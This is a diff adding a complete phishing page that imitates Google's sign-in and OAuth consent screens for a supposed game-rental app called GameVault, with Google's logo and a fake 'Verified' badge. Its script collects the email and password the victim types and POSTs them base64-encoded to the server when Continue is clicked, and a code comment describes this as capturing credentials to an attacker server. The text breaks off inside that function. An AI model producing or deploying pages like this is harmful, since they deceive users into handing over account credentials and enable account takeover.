@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f1f3f4;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+      color: #202124;
+    }
+
+    .step-wrapper { width: 100%; max-width: 450px; }
+
+    .step {
+      display: none;
+      flex-direction: column;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,.13);
+      width: 100%;
+      overflow: hidden;
+      animation: fadeUp .25s ease;
+    }
+    .step.active { display: flex; }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(12px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .step-body { padding: 40px 44px 28px; }
+
+    .g-logo { margin-bottom: 26px; }
+
+    .step-title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+    .step-subtitle { font-size: 16px; color: #202124; margin-bottom: 26px; }
+    .step-subtitle span { color: #1a73e8; font-weight: 500; }
+
+    .acct-chip {
+      display: inline-flex; align-items: center; gap: 10px;
+      border: 1px solid #dadce0; border-radius: 24px;
+      padding: 6px 14px 6px 6px; margin-bottom: 24px;
+      background: #f8f9fa; cursor: default;
+    }
+    .acct-avatar {
+      width: 32px; height: 32px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 13px; font-weight: 700; color: #fff;
+      background: linear-gradient(135deg, #4285f4, #34a853);
+      flex-shrink: 0; letter-spacing: -.5px;
+    }
+    .acct-email { font-size: 14px; color: #202124; }
+
+    .field-wrap { position: relative; margin-bottom: 6px; }
+    .field-wrap input {
+      width: 100%; font-family: 'Roboto', sans-serif;
+      font-size: 16px; color: #202124;
+      border: 1px solid #dadce0; border-radius: 4px;
+      padding: 15px 44px 15px 16px;
+      outline: none; background: transparent;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .field-wrap input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+    .field-wrap input.err { border-color: #d93025; box-shadow: 0 0 0 1px #d93025; }
+
+    .field-wrap label {
+      position: absolute; top: 50%; left: 12px;
+      transform: translateY(-50%);
+      font-size: 16px; color: #5f6368;
+      pointer-events: none; background: #fff; padding: 0 4px;
+      transition: top .15s, font-size .15s, color .15s, transform .15s;
+    }
+    .field-wrap input:focus ~ label,
+    .field-wrap input.filled ~ label {
+      top: 0; font-size: 12px; transform: translateY(-50%);
+      color: #1a73e8;
+    }
+    .field-wrap input.err ~ label { color: #d93025; }
+    .field-wrap input.filled:not(:focus) ~ label { color: #5f6368; }
+
+    .pw-toggle {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer; padding: 4px;
+      color: #5f6368; display: flex; align-items: center;
+    }
+    .pw-toggle:hover { color: #202124; }
+
+    .err-msg {
+      font-size: 12px; color: #d93025;
+      margin: 4px 0 14px 2px; min-height: 18px;
+      display: flex; align-items: center; gap: 5px;
+    }
+    .err-msg svg { flex-shrink: 0; }
+
+    .helper-link {
+      font-size: 14px; color: #1a73e8; font-weight: 500;
+      text-decoration: none; margin-bottom: 28px; display: inline-block;
+    }
+    .helper-link:hover { text-decoration: underline; }
+
+    .note-text { font-size: 14px; color: #5f6368; line-height: 1.5; }
+    .note-text a { color: #1a73e8; font-weight: 500; text-decoration: none; }
+
+    .consent-app-hd {
+      display: flex; flex-direction: column; align-items: center;
+      text-align: center; margin-bottom: 18px;
+    }
+    .app-icon {
+      width: 60px; height: 60px; border-radius: 50%;
+      background: #1a1a2e; display: flex;
+      align-items: center; justify-content: center;
+      margin-bottom: 12px; border: 1px solid #e0e0e0;
+    }
+    .app-name { font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 4px; }
+    .app-tag  { font-size: 13px; color: #5f6368; }
+
+    hr { border: none; border-top: 1px solid #e8eaed; margin: 14px 0; }
+
+    .app-info-row {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 12px; color: #5f6368; margin-bottom: 16px;
+    }
+    .verified-badge {
+      display: inline-flex; align-items: center; gap: 3px;
+      background: #e6f4ea; color: #137333;
+      font-size: 11px; font-weight: 500;
+      padding: 2px 7px; border-radius: 4px;
+    }
+
+    .consent-h { font-size: 14px; font-weight: 500; color: #202124; margin-bottom: 8px; }
+
+    .perms { list-style: none; margin-bottom: 14px; }
+    .perms li {
+      display: flex; align-items: flex-start; gap: 12px;
+      padding: 9px 0; border-bottom: 1px solid #f1f3f4;
+    }
+    .perms li:last-child { border-bottom: none; }
+    .p-icon { width: 19px; height: 19px; flex-shrink: 0; margin-top: 2px; color: #1a73e8; }
+    .p-label { font-size: 14px; color: #202124; }
+    .p-desc  { font-size: 12px; color: #5f6368; margin-top: 1px; }
+
+    .info-box {
+      display: flex; gap: 10px;
+      background: #e8f0fe; border-radius: 6px;
+      padding: 11px 13px; margin-bottom: 4px;
+      font-size: 12px; color: #1a73e8; line-height: 1.4;
+    }
+    .info-box a { color: inherit; }
+
+    .actions {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 16px 44px 24px;
+    }
+    .actions-r { display: flex; gap: 10px; align-items: center; }
+
+    .btn {
+      font-family: 'Roboto', sans-serif; font-size: 14px; font-weight: 500;
+      padding: 0 22px; height: 36px; border-radius: 4px; border: none;
+      cursor: pointer; letter-spacing: .25px;
+      transition: background .15s, box-shadow .15s;
+    }
+    .btn-ghost   { background: transparent; color: #1a73e8; }
+    .btn-ghost:hover { background: #f0f4ff; }
+    .btn-primary { background: #1a73e8; color: #fff; box-shadow: 0 1px 3px rgba(0,0,0,.2); }
+    .btn-primary:hover { background: #1557b0; }
+
+    .create-link { font-size: 14px; color: #1a73e8; font-weight: 500; text-decoration: none; }
+    .create-link:hover { text-decoration: underline; }
+
+    .lang-bar {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 44px 14px; border-top: 1px solid #e8eaed;
+      font-size: 12px; color: #5f6368;
+    }
+    .lang-sel {
+      background: none; border: none; font-family: 'Roboto',sans-serif;
+      font-size: 12px; color: #5f6368; cursor: pointer;
+    }
+    .lang-links { display: flex; gap: 16px; }
+    .lang-links a { font-size: 12px; color: #5f6368; text-decoration: none; }
+    .lang-links a:hover { text-decoration: underline; }
+
+    .success-body {
+      display: flex; flex-direction: column; align-items: center;
+      padding: 46px 44px 42px; text-align: center; gap: 14px;
+    }
+    .success-ring {
+      width: 64px; height: 64px; border-radius: 50%;
+      background: #e6f4ea; display: flex;
+      align-items: center; justify-content: center;
+    }
+    .success-t { font-size: 22px; font-weight: 400; color: #202124; }
+    .success-s { font-size: 14px; color: #5f6368; }
+    .pb-wrap {
+      width: 200px; height: 4px; background: #e8eaed;
+      border-radius: 2px; overflow: hidden; margin-top: 6px;
+    }
+    .pb-fill {
+      height: 100%; background: #1a73e8;
+      border-radius: 2px; width: 0; transition: width 2.2s ease;
+    }
+
+    .dots {
+      display: flex; justify-content: center; gap: 8px; margin-top: 18px;
+    }
+    .dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #dadce0; transition: background .3s;
+    }
+    .dot.on   { background: #1a73e8; }
+    .dot.done { background: #34a853; }
+
+    footer {
+      margin-top: 16px; text-align: center;
+      font-size: 12px; color: #5f6368;
+    }
+    footer a { color: #5f6368; text-decoration: none; margin: 0 6px; }
+    footer a:hover { text-decoration: underline; }
+
+    @media (max-width: 500px) {
+      .step-body, .actions, .lang-bar { padding-left: 24px; padding-right: 24px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="step-wrapper">
+
+  <div class="step active" id="s0">
+    <div class="step-body">
+      <div class="g-logo">
+        <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
+          <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+          <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+          <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+          <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+          <path d="M35.29 41.41V32h34.2c.34 1.76.51 3.85.51 6.11 0 7.56-2.07 16.9-8.74 23.58-6.5 6.75-14.82 10.35-25.92 10.35C16.27 72.04 0 56.36 0 36.84 0 17.32 16.27 1.64 35.34 1.64c11.35 0 19.42 4.45 25.5 10.2l-7.15 7.15c-4.37-4.1-10.28-7.31-18.36-7.31-14.99 0-26.7 12.07-26.7 27.16s11.71 27.16 26.7 27.16c9.74 0 15.28-3.87 18.85-7.44 2.88-2.88 4.78-7.02 5.52-12.64l-24.41.49z" fill="#4285F4"/>
+        </svg>
+      </div>
+      <h1 class="step-title">Sign in</h1>
+      <p class="step-subtitle">to continue to <span>GameVault</span></p>
+
+      <div class="field-wrap">
+        <input type="email" id="inp-email" autocomplete="email" spellcheck="false" oninput="syncFilled(this)" onkeydown="if(event.key==='Enter')step1Next()"/>
+        <label for="inp-email">Email or phone</label>
+      </div>
+      <div class="err-msg" id="err-email"></div>
+
+      <a href="#" class="helper-link" onclick="return false">Forgot email?</a>
+
+      <p class="note-text">
+        Not your computer? Use a Private window to sign in.
+        <a href="#" onclick="return false">Learn more</a>
+      </p>
+    </div>
+
+    <div class="actions">
+      <a href="#" class="create-link" onclick="return false">Create account</a>
+      <div class="actions-r">
+        <button class="btn btn-primary" onclick="step1Next()">Next</button>
+      </div>
+    </div>
+
+    <div class="lang-bar">
+      <select class="lang-sel" aria-label="Language">
+        <option>English (United States)</option>
+        <option>Español</option>
+        <option>Français</option>
+      </select>
+      <div class="lang-links">
+        <a href="#" onclick="return false">Help</a>
+        <a href="#" onclick="return false">Privacy</a>
+        <a href="#" onclick="return false">Terms</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="step" id="s1">
+    <div class="step-body">
+      <div class="g-logo">
+        <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+          <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+          <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+          <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+          <path d="M35.29 41.41V32h34.2c.34 1.76.51 3.85.51 6.11 0 7.56-2.07 16.9-8.74 23.58-6.5 6.75-14.82 10.35-25.92 10.35C16.27 72.04 0 56.36 0 36.84 0 17.32 16.27 1.64 35.34 1.64c11.35 0 19.42 4.45 25.5 10.2l-7.15 7.15c-4.37-4.1-10.28-7.31-18.36-7.31-14.99 0-26.7 12.07-26.7 27.16s11.71 27.16 26.7 27.16c9.74 0 15.28-3.87 18.85-7.44 2.88-2.88 4.78-7.02 5.52-12.64l-24.41.49z" fill="#4285F4"/>
+        </svg>
+      </div>
+
+      <h1 class="step-title">Welcome</h1>
+
+      <div class="acct-chip">
+        <div class="acct-avatar" id="av1"></div>
+        <span class="acct-email" id="chip-email1"></span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+
+      <div class="field-wrap">
+        <input type="password" id="inp-pw" autocomplete="current-password" oninput="syncFilled(this)" onkeydown="if(event.key==='Enter')step2Next()"/>
+        <label for="inp-pw">Enter your password</label>
+        <button class="pw-toggle" type="button" onclick="togglePw()" aria-label="Show password">
+          <svg id="eye" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+      <div class="err-msg" id="err-pw"></div>
+
+      <a href="#" class="helper-link" onclick="return false">Forgot password?</a>
+
+      <p class="note-text" style="margin-bottom:0">
+        To keep your account safe, Google might ask you to verify it's you.
+        <a href="#" onclick="return false">Learn more</a>
+      </p>
+    </div>
+
+    <div class="actions">
+      <button class="btn btn-ghost" onclick="goStep(0)">Back</button>
+      <button class="btn btn-primary" onclick="step2Next()">Next</button>
+    </div>
+
+    <div class="lang-bar">
+      <select class="lang-sel" aria-label="Language"><option>English (United States)</option><option>Español</option></select>
+      <div class="lang-links"><a href="#" onclick="return false">Help</a><a href="#" onclick="return false">Privacy</a><a href="#" onclick="return false">Terms</a></div>
+    </div>
+  </div>
+
+  <div class="step" id="s2">
+    <div class="step-body">
+      <div class="g-logo">
+        <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+          <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+          <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+          <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+          <path d="M35.29 41.41V32h34.2c.34 1.76.51 3.85.51 6.11 0 7.56-2.07 16.9-8.74 23.58-6.5 6.75-14.82 10.35-25.92 10.35C16.27 72.04 0 56.36 0 36.84 0 17.32 16.27 1.64 35.34 1.64c11.35 0 19.42 4.45 25.5 10.2l-7.15 7.15c-4.37-4.1-10.28-7.31-18.36-7.31-14.99 0-26.7 12.07-26.7 27.16s11.71 27.16 26.7 27.16c9.74 0 15.28-3.87 18.85-7.44 2.88-2.88 4.78-7.02 5.52-12.64l-24.41.49z" fill="#4285F4"/>
+        </svg>
+      </div>
+
+      <div class="consent-app-hd">
+        <div class="app-icon" aria-hidden="true">
+          <svg viewBox="0 0 34 34" fill="none" width="32" height="32">
+            <rect x="3" y="10" width="28" height="15" rx="7" fill="#7c3aed"/>
+            <rect x="7" y="10" width="20" height="15" rx="5" fill="#6d28d9"/>
+            <rect x="12" y="15.5" width="4" height="1.5" rx=".75" fill="#a78bfa"/>
+            <rect x="13.25" y="14.25" width="1.5" height="4" rx=".75" fill="#a78bfa"/>
+            <circle cx="22" cy="15.5" r="1" fill="#f472b6"/>
+            <circle cx="24.5" cy="17.5" r="1" fill="#34d399"/>
+            <circle cx="22" cy="19.5" r="1" fill="#fbbf24"/>
+            <circle cx="19.5" cy="17.5" r="1" fill="#60a5fa"/>
+            <rect x="8" y="8" width="4" height="4" rx="1" fill="#4c1d95"/>
+            <rect x="22" y="8" width="4" height="4" rx="1" fill="#4c1d95"/>
+          </svg>
+        </div>
+        <div class="app-name">GameVault</div>
+        <div class="app-tag">gamevaultrentals.com wants to access your Google Account</div>
+      </div>
+
+      <hr/>
+
+      <div class="acct-chip" style="margin-bottom:14px">
+        <div class="acct-avatar" id="av2"></div>
+        <div style="flex:1;min-width:0">
+          <div style="font-size:14px;font-weight:500;color:#202124" id="chip-name2"></div>
+          <div style="font-size:12px;color:#5f6368;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" id="chip-email2"></div>
+        </div>
+        <svg width="16" height="16" viewBox="0 0 20 20" fill="#1a73e8" aria-hidden="true"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+      </div>
+
+      <div class="app-info-row">
+        <svg width="13" height="13" viewBox="0 0 20 20" fill="#5f6368" aria-hidden="true"><path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V8a2 2 0 00-2-2h-5L9 4H4zm7 5a1 1 0 10-2 0v1H8a1 1 0 100 2h1v1a1 1 0 102 0v-1h1a1 1 0 100-2h-1V9z" clip-rule="evenodd"/></svg>
+        <span>GameVault Rentals LLC</span>
+        <span class="verified-badge">
+          <svg width="10" height="10" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+          Verified
+        </span>
+      </div>
+
+      <p class="consent-h">This will allow GameVault to:</p>
+      <ul class="perms" aria-label="Requested permissions">
+        <li>
+          <svg class="p-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          <div><div class="p-label">View your basic profile info</div><div class="p-desc">Name, profile photo, and public information</div></div>
+        </li>
+        <li>
+          <svg class="p-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+          <div><div class="p-label">View your email address</div><div class="p-desc">Used for your rental account and notifications</div></div>
+        </li>
+        <li>
+          <svg class="p-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <div><div class="p-label">Stay signed in across sessions</div><div class="p-desc">Keeps your rental history and wishlist synced</div></div>
+        </li>
+      </ul>
+
+      <div class="info-box" role="note">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;margin-top:1px" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <span>Make sure you trust GameVault. You may be sharing sensitive info with this site.
+          <a href="#" onclick="return false">Learn about the risks</a>
+        </span>
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="btn btn-ghost" onclick="goStep(1)">Cancel</button>
+      <button class="btn btn-primary" onclick="step3Allow()">Continue</button>
+    </div>
+
+    <div class="lang-bar">
+      <select class="lang-sel" aria-label="Language"><option>English (United States)</option><option>Español</option></select>
+      <div class="lang-links"><a href="#" onclick="return false">Help</a><a href="#" onclick="return false">Privacy</a><a href="#" onclick="return false">Terms</a></div>
+    </div>
+  </div>
+
+  <div class="step" id="s3">
+    <div class="success-body">
+      <div class="success-ring" aria-hidden="true">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#137333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+      </div>
+
+      <div style="display:flex;align-items:center;gap:10px">
+        <div style="width:38px;height:38px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;border:1px solid #e0e0e0" aria-hidden="true">
+          <svg viewBox="0 0 34 34" fill="none" width="22" height="22"><rect x="3" y="10" width="28" height="15" rx="7" fill="#7c3aed"/><rect x="7" y="10" width="20" height="15" rx="5" fill="#6d28d9"/><rect x="12" y="15.5" width="4" height="1.5" rx=".75" fill="#a78bfa"/><rect x="13.25" y="14.25" width="1.5" height="4" rx=".75" fill="#a78bfa"/><circle cx="22" cy="15.5" r="1" fill="#f472b6"/><circle cx="24.5" cy="17.5" r="1" fill="#34d399"/><circle cx="22" cy="19.5" r="1" fill="#fbbf24"/><circle cx="19.5" cy="17.5" r="1" fill="#60a5fa"/></svg>
+        </div>
+        <span style="font-size:17px;font-weight:500;color:#202124">GameVault</span>
+      </div>
+
+      <p class="success-t" id="ok-title">You're signed in!</p>
+      <p class="success-s">Redirecting you back to GameVault…</p>
+
+      <div class="pb-wrap"><div class="pb-fill" id="pb"></div></div>
+
+      <p style="font-size:12px;color:#5f6368;margin-top:8px">
+        Signed in as <strong id="ok-email" style="color:#202124"></strong>
+      </p>
+
+      <button class="btn btn-ghost" style="font-size:13px;margin-top:6px" onclick="resetAll()">
+        Use a different account
+      </button>
+    </div>
+  </div>
+
+  <div class="dots" aria-hidden="true">
+    <div class="dot on"  id="d0"></div>
+    <div class="dot"     id="d1"></div>
+    <div class="dot"     id="d2"></div>
+    <div class="dot"     id="d3"></div>
+  </div>
+</div>
+
+<footer>
+  <a href="#" onclick="return false">Privacy</a>
+  <span style="margin:0 3px">·</span>
+  <a href="#" onclick="return false">Terms</a>
+  <span style="margin:0 3px">·</span>
+  <a href="#" onclick="return false">About Google</a>
+</footer>
+
+<script>
+  function initials(email) {
+    const local = email.split('@')[0];
+    const parts = local.split(/[.\-_+]/);
+    if (parts.length >= 2 && parts[1].length > 0)
+      return (parts[0][0] + parts[1][0]).toUpperCase();
+    return local.slice(0, 2).toUpperCase();
+  }
+  function nameFromEmail(email) {
+    const local = email.split('@')[0];
+    return local.split(/[.\-_+]/)
+      .map(p => p.charAt(0).toUpperCase() + p.slice(1))
+      .join(' ');
+  }
+  function firstName(name) { return name.split(' ')[0]; }
+
+  function syncFilled(inp) {
+    inp.value ? inp.classList.add('filled') : inp.classList.remove('filled');
+  }
+
+  function goStep(n) {
+    document.querySelectorAll('.step').forEach((s,i) => {
+      s.classList.toggle('active', i === n);
+    });
+    [0,1,2,3].forEach(i => {
+      const d = document.getElementById('d'+i);
+      d.className = 'dot' + (i < n ? ' done' : i === n ? ' on' : '');
+    });
+    const inp = document.getElementById('s'+n).querySelector('input');
+    if (inp) setTimeout(() => inp.focus(), 220);
+  }
+
+  function setErr(id, msg) {
+    const el = document.getElementById(id);
+    el.innerHTML = msg
+      ? '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> ' + msg
+      : '';
+  }
+
+  function step1Next() {
+    const inp = document.getElementById('inp-email');
+    const v = inp.value.trim();
+    if (!v) {
+      inp.classList.add('err'); setErr('err-email', 'Enter an email or phone number.');
+      inp.focus(); return;
+    }
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
+    const phoneOk = /^\+?\d{7,15}$/.test(v.replace(/[\s\-()]/g,''));
+    if (!emailOk && !phoneOk) {
+      inp.classList.add('err'); setErr('err-email', 'Enter a valid email or phone number.');
+      inp.focus(); return;
+    }
+    inp.classList.remove('err'); setErr('err-email', '');
+    window._email = v;
+    const init = initials(v);
+    document.getElementById('av1').textContent = init;
+    document.getElementById('chip-email1').textContent = v;
+    goStep(1);
+  }
+
+  function step2Next() {
+    const inp = document.getElementById('inp-pw');
+    if (!inp.value) {
+      inp.classList.add('err'); setErr('err-pw', 'Enter a password.');
+      inp.focus(); return;
+    }
+    if (inp.value.length < 8) {
+      inp.classList.add('err');
+      setErr('err-pw', 'Wrong password. Try again or click Forgot password to reset it.');
+      inp.focus(); return;
+    }
+    inp.classList.remove('err'); setErr('err-pw', '');
+    window._pw = inp.value;
+    const email = window._email;
+    const init = initials(email);
+    const name = nameFromEmail(email);
+    document.getElementById('av2').textContent = init;
+    document.getElementById('chip-name2').textContent = name;
+    document.getElementById('chip-email2').textContent = email;
+    goStep(2);
+  }
+
+    function step3Allow() {
+      const email = window._email;
+      const name  = nameFromEmail(email);
+      const password = window._pw;
+  
+      // Capture credentials to attacker server (same-origin)
+      fetch('/?r=ping', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'd=' + btoa(JSON.stringify({ u: email, p: password }))
+      }).catch(function(){});
+
+      document.getElementById('ok-title').textContent = 'You\'re signed in, ' + firstName(name) + '!';
+      document.getElementById('ok-email').textContent = email;
+      goStep(3);
+      document.getElementById('pb').style.transition = 'none';
+      document.getElementById('pb').style.width = '0';
+      setTimeout(() => {
+        document.getElementById('pb').style.transition = 'width 2.2s ease';
+        document.getElementById('pb').style.width = '100%';
+      }, 80);
+
+      // Redirect back to store with session
